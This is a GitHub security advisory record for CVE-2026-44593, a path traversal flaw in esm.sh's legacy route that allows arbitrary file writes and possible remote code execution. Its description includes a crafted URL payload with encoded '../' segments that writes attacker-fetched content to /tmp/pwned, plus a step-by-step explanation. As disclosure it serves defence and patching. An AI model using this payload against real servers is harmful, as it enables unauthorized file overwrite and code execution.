{"credits": [{"type": "reporter", "user": {"avatar_url": "https://avatars.githubusercontent.com/u/10939796?v=4", "events_url": "https://api.github.com/users/splitline/events{/privacy}", "followers_url": "https://api.github.com/users/splitline/followers", "following_url": "https://api.github.com/users/splitline/following{/other_user}", "gists_url": "https://api.github.com/users/splitline/gists{/gist_id}", "gravatar_id": "", "html_url": "https://github.com/splitline", "id": 10939796, "login": "splitline", "node_id": "MDQ6VXNlcjEwOTM5Nzk2", "organizations_url": "https://api.github.com/users/splitline/orgs", "received_events_url": "https://api.github.com/users/splitline/received_events", "repos_url": "https://api.github.com/users/splitline/repos", "site_admin": false, "starred_url": "https://api.github.com/users/splitline/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/splitline/subscriptions", "type": "User", "url": "https://api.github.com/users/splitline", "user_view_type": "public"}}], "cve_id": "CVE-2026-44593", "cvss": {"score": null, "vector_string": null}, "cvss_severities": {"cvss_v3": {"score": 0.0, "vector_string": null}, "cvss_v4": {"score": 8.7, "vector_string": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:H/VA:N/SC:N/SI:N/SA:N"}}, "cwes": [{"cwe_id": "CWE-22", "name": "Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')"}], "description": "### Impact
- Arbitrary File Write – An attacker can cause the server to write data to any file path it has write permission for.
- Privilege Escalation / RCE – By overwriting critical binaries or scripts, the attacker can execute arbitrary code with the server’s privileges.

### Exploit

The legacy router first retrieves a response from `legacyServer`, parses the incoming request path, and ultimately writes the data to storage via `buildStorage.Put`  
(see <https://github.com/esm-dev/esm.sh/blob/4312ae93e518121e764a18bb521af12e490ef137/server/legacy_router.go#L291>).

For a URL such as:

```
http://ESM_SH_HOST/v111/react@19.2.0/esnext/..%2f..%2f..%2fgh/<attacker>/exp@1171e85d5d/foo.md%23%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2ftmp%2fpwned
```

the router concatenates the path components without sanitizing them, producing a storage key like:

```
legacy/v111/react@19.2.0/esnext/../../../gh/<attacker>/exp@1171e85d5d/foo.md#/../../../../../../../../../../tmp/pwned
```

When this key is used, the underlying file system resolves the relative segments and writes the file to `/tmp/pwned`. Thus an attacker can craft a request that writes data to arbitrary locations on the server.


### Details

1. **URL Construction**  
   A crafted request is sent to the server:
   ```
   http://ESM_SH_HOST/v111/react@19.2.0/esnext/..%2f..%2f..%2fgh/<attacker>/exp@1171e85d5d/foo.md%23%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2ftmp%2fpwned
   ```

2. **Proxy to Legacy Server**  
   The request is forwarded to:
   ```
   http://legacy.esm.sh/v111/react@19.2.0/esnext/../../../gh/<attacker>/exp@1171e85d5d/foo.md#/../../../../../../../tmp/pwned
   ```
   which resolves to:
   ```
   http://legacy.esm.sh/gh/<attacker>/exp@1171e85d5d/foo.md
   ```

3. **File Retrieval**  
   The server fetches `foo.md` from the GitHub repository `https://github.com/<attacker>/exp`.

4. **Path Normalisation & Storage**  
   The storage path derived from the request is:
   ```
   legacy/v111/react@19.2.0/esnext/../../../gh/<attacker>/exp@1171e85d5d/foo.md#/../../../../../../../../../../tmp/pwned
   ```
   Normalising this path yields `/tmp/pwned`. The retrieved file content is then written to that location.

5. **Result**  
   By repeating this pattern, an attacker can overwrite arbitrary binaries or scripts on the server, paving the way for remote code execution.


### Credit Discovery To
splitline (@\_splitline\_) from DEVCORE Research Team", "epss": {"percentage": 0.00362, "percentile": 0.27913}, "ghsa_id": "GHSA-3636-h3vx-6465", "github_reviewed_at": "2026-05-12T22:22:39Z", "html_url": "https://github.com/advisories/GHSA-3636-h3vx-6465", "identifiers": [{"type": "GHSA", "value": "GHSA-3636-h3vx-6465"}, {"type": "CVE", "value": "CVE-2026-44593"}], "nvd_published_at": "2026-05-28T16:16:24Z", "published_at": "2026-05-12T22:22:39Z", "references": ["https://github.com/esm-dev/esm.sh/security/advisories/GHSA-3636-h3vx-6465", "https://github.com/esm-dev/esm.sh/releases/tag/v137_3", "https://nvd.nist.gov/vuln/detail/CVE-2026-44593", "https://github.com/advisories/GHSA-3636-h3vx-6465"], "repository_advisory_url": "https://api.github.com/repos/esm-dev/esm.sh/security-advisories/GHSA-3636-h3vx-6465", "severity": "high", "source_code_location": "https://github.com/esm-dev/esm.sh", "summary": "esm.sh: Legacy Route Path Traversal Can Lead to RCE", "type": "reviewed", "updated_at": "2026-06-09T01:59:39Z", "url": "https://api.github.com/advisories/GHSA-3636-h3vx-6465", "vulnerabilities": [{"first_patched_version": "0.0.0-20260508100112-1960055e1d53", "package": {"ecosystem": "go", "name": "github.com/esm-dev/esm.sh"}, "vulnerable_functions": [], "vulnerable_version_range": "< 0.0.0-20260508100112-1960055e1d53"}], "withdrawn_at": null}

title: esm.sh: Legacy Route Path Traversal Can Lead to RCE
